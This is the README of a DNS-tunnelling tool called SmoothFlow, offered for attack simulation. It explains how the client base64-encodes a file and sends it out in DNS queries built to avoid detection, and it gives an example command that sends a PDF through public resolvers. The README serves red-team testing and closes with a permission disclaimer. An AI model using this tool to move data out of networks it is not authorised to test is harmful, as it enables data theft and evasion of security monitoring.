

# SmoothFlow - Advanced DNS Tunnel Application

SmoothFlow is an advanced DNS tunnel application developed for attack simulation purposes. It enables seamless and secure data transmission by encapsulating data within DNS queries, offering robust obfuscation and uninterrupted connectivity. The application is designed to be highly resilient against detection by security infrastructure, making it a valuable tool for testing and analyzing network security and data privacy. Key features include advanced encryption, adaptive protocol handling, and an intuitive interface.

## Features

- **Robust Data Obfuscation:** Encapsulates data in DNS queries to ensure robust obfuscation.
- **Seamless Connectivity:** Maintains uninterrupted connectivity for data transmission.
- **Cross-Platform Cache Management:** Clears DNS cache on both Windows and Linux systems.
- **Flexible Domain and DNS Configuration:** Customizable DNS server IPs, ports, and query types.
- **Error Handling and Logging:** Comprehensive logging for debugging and monitoring.
- **Automatic Package Installation:** Required Python packages are automatically installed when the script runs if they are missing.
- **Server Component:** A server-side component is planned to be added in a future update.

## Installation

To get started, you need to install the required Python packages. SmoothFlow will automatically install missing packages as needed.

### Requirements

- Python 3.6 or higher
- Required Python packages are automatically installed when the script runs if they are missing.
- The following Python packages:
  - `cryptography==39.0.1`
  - `dnspython==2.0.0`
  - `yagmail==0.15.293`
  - `tqdm==4.46.0`

### Installation Steps

1. Clone the repository:

    ```bash
    https://github.com/ebubekirbbr/SmoothFlow
    cd SmoothFlow
    ```

2. Run the script. The script will handle package installation if required:

    ```bash
    python SmootFlowClient.py --dnsips <dns_ips> --dnsport <dns_port> --tunneldomains <tunnel_domains> --filepath <file_path> --querytype <query_type> --timeout <timeout>
    ```

## Usage

Run the script with the necessary arguments:

```bash
  cd src_client
  python SmootFlowClient.py --dnsips <dns_ips> --dnsport <dns_port> --tunneldomains <tunnel_domains> --filepath <file_path> --querytype <query_type> --timeout <timeout>
```

### Arguments

- `--dnsips`: Comma-separated list of DNS server IPs.
- `--dnsport`: DNS server port (default is 53).
- `--tunneldomains`: Comma-separated list of tunnel domains.
- `--filepath`: Path to the file to be encoded and transmitted.
- `--querytype`: DNS query type (default is 'A').
- `--timeout`: Timeout for DNS queries (default is 1 second).

### Example

```bash
  cd src_client
  python SmootFlowClient.py --dnsips 8.8.8.8,8.8.4.4 --dnsport 53 --tunneldomains example.com,example.net --filepath ../example_files/MeetingNotes.pdf --querytype A --timeout 1
```

## Example Files

Files in the `example_files` directory contain completely fake data and do not include any confidential information. These files can be used for testing purposes.


## Details

- **Encoding and Transmission:** The application encodes the file in base64 and splits it into DNS queries.
- **File Size Requirement:** The file should be at least 10KB in size for testing purposes.
- **Logging:** Logs detailed information and errors to help with debugging.

## License

This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer

SmoothFlow is intended for educational and testing purposes only. Ensure you have permission to test DNS tunneling on any network you use.

